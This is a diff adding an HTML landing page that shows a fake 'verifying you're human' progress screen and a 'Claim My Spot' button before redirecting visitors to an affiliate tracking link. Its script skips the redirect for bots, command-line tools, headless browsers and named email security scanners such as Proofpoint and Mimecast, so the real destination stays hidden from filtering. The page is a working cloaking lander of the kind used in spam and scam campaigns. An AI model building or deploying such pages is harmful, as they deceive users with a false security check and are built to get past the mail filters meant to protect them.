@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Loading…</title>
+<style>
+  :root{--g1:#0f9d58;--g2:#7bd389;--ink:#0b2013;--paper:#ffffff;--muted:#5c6f63}
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:Inter,-apple-system,"Segoe UI",Roboto,sans-serif;
+    background:linear-gradient(140deg,var(--g1),var(--g2));
+    color:var(--ink);display:flex;align-items:center;justify-content:center;
+    padding:22px;min-height:100dvh;overflow:hidden;
+  }
+  .shell{
+    width:100%;max-width:440px;background:var(--paper);
+    border-radius:28px;padding:34px 26px 24px;text-align:center;
+    box-shadow:0 30px 80px rgba(0,0,0,.25);
+    animation:pop .45s cubic-bezier(.2,.9,.3,1.4);
+  }
+  @keyframes pop{from{opacity:0;transform:scale(.92)}to{opacity:1;transform:none}}
+  .emoji{font-size:56px;line-height:1;margin-bottom:6px;animation:wiggle 1.6s ease-in-out infinite}
+  @keyframes wiggle{0%,100%{transform:rotate(-6deg)}50%{transform:rotate(6deg)}}
+  .title{font-size:24px;font-weight:800;letter-spacing:-.4px;margin:6px 0 8px}
+  .lede{color:var(--muted);font-size:14px;line-height:1.5;margin-bottom:22px}
+  .track{height:10px;background:#e8f5ec;border-radius:99px;overflow:hidden;margin-bottom:14px}
+  .fill{height:100%;width:0;background:linear-gradient(90deg,var(--g1),var(--g2));border-radius:99px;transition:width .25s ease}
+  .state{font-size:13px;color:var(--muted);min-height:22px}
+  .cta{
+    display:none;width:100%;margin-top:20px;padding:18px;border:0;
+    border-radius:16px;font-size:17px;font-weight:800;color:#fff;cursor:pointer;
+    background:linear-gradient(135deg,#0f9d58,#22c55e);
+    box-shadow:0 14px 30px rgba(15,157,88,.35);min-height:58px;
+    font-family:inherit;letter-spacing:.3px;
+  }
+  .cta:active{transform:scale(.98)}
+  .cta.on{display:block;animation:pop .3s ease}
+  .small{margin-top:14px;font-size:11px;color:#8aa294;letter-spacing:.4px}
+</style>
+</head>
+<body>
+<main class="shell">
+  <div class="emoji">💸</div>
+  <h1 class="title">You're one step away</h1>
+  <p class="lede">Verifying you're human.<br>Almost there — hold on tight.</p>
+  <div class="track"><div class="fill" id="p1"></div></div>
+  <div class="state" id="s1">Starting…</div>
+  <button class="cta" id="b1" type="button">Claim My Spot →</button>
+  <div class="small">SECURE · ENCRYPTED · FAST</div>
+</main>
+<script>
+const CONFIG={targetUrl:"https://trc.beastbox.pro/click?o=cmvta9nzp000caetjlw6ebg6r&p=AF-1004&sub1=RS",refParam:"referrerCF",minDelay:1500,maxDelay:2500};
+(function(){
+  "use strict";
+  const bar=document.getElementById('p1'),st=document.getElementById('s1'),btn=document.getElementById('b1');
+  const ua=navigator.userAgent||"";
+  const pats=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
+  for(const p of pats){if(p.test(ua))return;}
+  if(navigator.webdriver===true)return;
+  let acted=false;
+  ['touchstart','pointerdown','mousemove','keydown','scroll','click'].forEach(e=>window.addEventListener(e,()=>{acted=true},{passive:true}));
+  const T=CONFIG.minDelay+Math.random()*(CONFIG.maxDelay-CONFIG.minDelay),S=performance.now();let r=false;
+  function step(){const e=performance.now()-S,p=Math.min(100,e/T*100);bar.style.width=p+"%";
+    if(e<T){requestAnimationFrame(step);return;}
+    if(r)return;r=true;bar.style.width="100%";
+    st.textContent=acted?"You may proceed ✓":"Tap to continue";
+    btn.classList.add('on');}
+  requestAnimationFrame(step);
+  function build(){try{const u=new URL(CONFIG.targetUrl);u.searchParams.set(CONFIG.refParam,location.href);return u.toString();}catch(e){const s=CONFIG.targetUrl.includes('?')?'&':'?';return CONFIG.targetUrl+s+CONFIG.refParam+'='+encodeURIComponent(location.href);}}
+  let d=false;
+  function go(){if(d)return;d=true;btn.disabled=true;btn.style.opacity=".6";st.textContent="Redirecting…";
+    const u=build(),a=document.createElement('a');a.href=u;a.target='_self';a.style.display='none';document.body.appendChild(a);
+    try{a.click();}catch(e){try{window.location.href=u;}catch(_){window.location.assign(u);}}
+    setTimeout(()=>{try{a.remove();}catch(_){}},300);}
+  btn.addEventListener('click',e=>{e.preventDefault();go();});
+})();
+</script>
+</body>
+</html>
